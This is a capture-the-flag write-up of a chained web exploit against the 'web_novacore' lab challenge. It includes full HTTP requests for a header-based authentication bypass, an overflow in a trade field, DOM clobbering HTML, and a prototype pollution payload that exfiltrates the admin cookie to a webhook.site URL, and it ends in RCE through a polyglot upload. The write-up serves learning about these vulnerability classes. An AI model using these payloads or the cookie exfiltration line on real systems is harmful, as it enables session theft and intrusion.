## Introduction: The Attack Path

This challenge was a masterclass in chaining multiple, distinct vulnerability classes to achieve a final goal. The exploit path was non-linear and required careful setup of multiple components before a final trigger could be pulled. The core of the challenge was bypassing a strict Content-Security-Policy (CSP) with a `nonce` to achieve XSS on the admin account. This was made possible by manipulating the logic of a front-end JavaScript file (`dashboard.js`) through a combination of DOM Clobbering and Prototype Pollution, which was itself set up using a memory corruption vulnerability.

The full chain can be summarized as follows:
1.  **Auth Bypass:** Become `sys_admin` using a hop-by-hop header bypass.
2.  **Memory Corruption:** As `sys_admin`, create two trades. Use a memory overflow to creaate trade as `admin` user.
3.  **Payload Planting (Part 1):** Edit the now admin-owned trade to inject a DOM Clobbering payload. This payload won't execute directly but will manipulate the DOM for a later script.
4.  **Payload Planting (Part 2):** Use an unauthenticated `/front_end_error/new/{name}` endpoint to store a JSON object containing a Prototype Pollution payload.
5.  **Triggering the Chain:** When the admin bot visit the compromised trade, the DOM Clobbering payload trigger the catch error in `dashboard.js`.
6.  **CSP/Nonce Bypass:** The script's error handling logic is manipulated:

    * DOM Clobbering makes the script check `window.UI_DEV_MODE` pass.
    * A path traversal, also injected via DOM Clobbering, forces the script to `fetch` our pre-planted Prototype Pollution payload from `/front_end_error/view/{name}` instead of reporting a new error.
    * The fetched JSON is parsed and merged, triggering the Prototype Pollution.
    * The polluted prototype value is passed into an `eval()`, executing our XSS payload and exfiltrating the admin's session cookie.
8.  **Remote Code Execution:** Use the stolen admin cookie to authenticate to a plugin upload endpoint and upload a specially crafted TAR/ELF polyglot file to bypass file validation and gain RCE.

## Step-by-Step Exploit Breakdown

### Step 1: Authentication Bypass via Hop-by-Hop Headers

Initial access was gained by exploiting how the application's reverse proxy handled hop-by-hop headers. By including `X-Real-IP` in the `Connection` header, the proxy would strip this header before forwarding the request to the backend. However, it would still process the `X-Real-IP` header itself. By setting `X-Real-IP: 127.0.0.1`, the backend application trusted the header and granted us `sys_admin` privileges.

The key headers were:
```http
X-Real-IP: 127.0.0.1
Connection: close, X-Real-IP
```

### Step 2: Gaining Control via Memory Corruption

With `sys_admin` access, we could create trades. The vulnerability lay in the `edit_trade` function, which was susceptible to a overflow in the `symbol` parameter. This allowed us to overwrite the data of an adjacent trade object in memory.

The request to perform the overflow looked like this:

```http
POST /api/edit_trade HTTP/1.1
Host: 83.136.252.78:51714
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
X-Real-IP: 127.0.0.1
Connection: close, X-Real-IP
Content-Length: 387
Content-Type: application/json

{
    "trade_id": "0b8618b8-d93d-44d0-ac5f-aaf69b7e3e31", 
    "symbol": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuser:1:trade:cb474955-6761-494e-a050-aa7993403fd6"
 
}
```

### Step 3: Planting the Payloads

Now that we controlled an admin's trade, we needed to plant two different payloads.

#### A. The DOM Clobbering Payload

We edited the trade to include an HTML payload in its `symbol`.

```http
POST /api/edit_trade HTTP/1.1
Host: 83.136.252.78:51714
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
X-Real-IP: 127.0.0.1
Connection: close, X-Real-IP
Content-Length: 266
Content-Type: application/json

{
    "trade_id": "cb474955-6761-494e-a050-aa7993403fd6", 
    "symbol": "<form/name=\"getElementById\"/value=\"test\"></form><a/id=\"UI_DEV_MODE\"></a><anything/id=\"LOG_LEVEL\"/int=\"../view/random\"></anything>",
    "action": "BUY",
    "price": "1.0"
}
```

#### B. The Prototype Pollution Payload

Next, we used the `/front_end_error` endpoint to store our final XSS payload within a JSON structure.

```http
POST /front_end_error/new/random HTTP/1.1
Host: 83.136.252.78:51714
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
X-Real-IP: 127.0.0.1
Connection: close, X-Real-IP
Content-Length: 117
Content-Type: application/json

{"__proto__":{"length":"(location='https://webhook.site/xxxxxxx/?c='+document.cookie)"}}
```

### Step 4: Triggering the Exploit Chain

With all the pieces in place, the exploit triggers automatically when the admin user visits their dashboard and views the compromised trade. This causes the chain of events described previously: the DOM is clobbered, a controlled error occurs, the error handler fetches our Prototype Pollution payload via a path traversal, the `Object.prototype` is polluted, and finally, `eval()` executes our code, stealing the admin's cookie.

### Step 5: Post-Exploitation to RCE

With the admin's session cookie, we authenticated to the application as the admin. We discovered a plugin upload feature at a `/run_plugin` endpoint. To bypass the backend `tar` and `readelf` checks, we crafted a polyglot file that was simultaneously a valid TAR archive and a valid ELF executable. Uploading and executing this polyglot file bypassed the validation and gave us Remote Code Execution on the server.

## Conclusion

The `web_novacore` challenge was a formidable and deeply rewarding experience. It brilliantly wove together an array of advanced web vulnerabilities, demanding a thorough understanding of not just each individual flaw, but precisely how they could be chained together. The reliance on DOM Clobbering to pivot to Prototype Pollution as a CSP bypass was particularly ingenious. This was a true "final boss" web challenge.
